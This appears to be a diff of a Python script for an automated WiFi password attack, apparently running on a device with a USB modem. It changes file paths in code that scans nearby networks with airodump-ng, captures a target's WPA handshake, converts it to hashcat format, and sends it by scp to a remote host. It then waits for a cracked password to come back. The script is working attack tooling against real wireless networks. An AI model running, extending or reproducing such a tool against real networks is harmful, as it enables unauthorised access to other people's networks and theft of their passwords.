@@ -20,7 +20,7 @@ ERROR_PREFIX = '[!]'
 
 def check_config_file():
     try:
-        with open('configuration.json') as f:
+        with open('src/configuration.json') as f:
             configuration_fields = json.load(f)
             mandatory_fields = ['interface']
             abort_program = False
@@ -37,19 +37,22 @@ def check_config_file():
         
         
 def check_dependencies():
-    dependencies = ['hcxpcapngtool', 'minicom', 'dhclient', 'wpa_passphrase', 'wpa_supplicant']
+    dependencies = ['hcxpcapngtool', 'minicom', 'dhclient --help', 'wpa_passphrase', 'wpa_supplicant --help', 'screen --help']
     for command in dependencies:
         output = subprocess.run(command, shell=True, capture_output=True, text=True)
+        if command == 'wpa_supplicant':
+            print(f'STDOUT --> {output.stdout}')
+            print(f'STDERR --> {output.stderr}')
         if output.returncode != 0 and output.returncode != 1:
             write_log(f'[!] Command "{command}" not installed')
             sys.exit(1)
             
             
 def enable_internet():
-    path = os.path.join('minicom', 'init.txt')
     try:
-        with open(path, 'r') as _:
-            command = 'minicom -D /dev/ttyUSB2 -S minicom/init.txt'
+        file_path = os.path.join('minicom', 'init.txt')
+        with open(file_path) as _:
+            command = f'minicom -D /dev/ttyUSB2 -S {file_path}'
             subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
             time.sleep(60)
@@ -66,14 +69,13 @@ def enable_internet():
             
             
 def pcap_to_hashcat_format(file_name: str):
-    command = f'hcxpcapngtool -o psk.hc22000 {file_name}-01.cap'
+    command = f'hcxpcapngtool -o src/files/{file_name}.hc22000 src/files/{file_name}-01.cap'
     run = subprocess.run(command, shell=True, capture_output=True, text=True)
     if run.stderr:
         write_log(f'[!] Failed in command "{command}"')
         sys.exit(1)
     else:
         write_log(f'[+] .cap file exported correctly to hashcat format')
-        return 'psk.hc22000'
 
 
 if __name__ == '__main__':
@@ -95,7 +97,7 @@ if __name__ == '__main__':
 
     # Exporting csv file to get all networks
     output_file_name = 'networks'
-    args = ['--output-format csv', f'-w files/{output_file_name}']
+    args = ['--output-format csv', f'-w src/files/{output_file_name}']
     airodump.exec(monitor_interface, args)
 
     # Once airodump has stored all networks, I get the network bssid and its channel
@@ -106,7 +108,7 @@ if __name__ == '__main__':
         
     # Get 4-way-handshake
     handshake_file_name = f'{network_ssid}-handshake'
-    args = [f'-c {channel}', f'--bssid {bssid}', f'-w files/{handshake_file_name}', '--output-format pcap']
+    args = [f'-c {channel}', f'--bssid {bssid}', f'-w src/files/{handshake_file_name}', '--output-format pcap']
     shell_command = airodump.get_str_shell_command(monitor_interface, args)
     
     # Execute airodump-ng as subprocess
@@ -149,19 +151,19 @@ if __name__ == '__main__':
             host = method_to_send['scp'].get('host')
             path = method_to_send['scp'].get('path')
             
-            command = f'scp psk.hc22000 {user}@{host}:{path}'
+            command = f'scp src/files/{handshake_file_name}.hc22000 {user}@{host}:{path}'
             output = subprocess.run(command, shell=True, capture_output=True, text=True)
             if output.stderr:
-                write_log(f'[!] Error transfering over scp psk.hc22000')
+                write_log(f'[!] Error transfering over scp {handshake_file_name}.hc22000')
                 sys.exit(1)
         else:
             write_log("[!] You must specify fields 'user' and 'host' to use scp")
             
+    print('[+] Ahora empieza la espera para recibir la password crackeada')
     cracked_password: str = None
     while not cracked_password:
         try:
-            file_path = os.path.join('files', 'cracked_password.txt')
-            with open(file_path) as f:
+            with open('src/files/cracked_password.txt') as f:
                 cracked_password = f.read()
                     
         except FileNotFoundError:
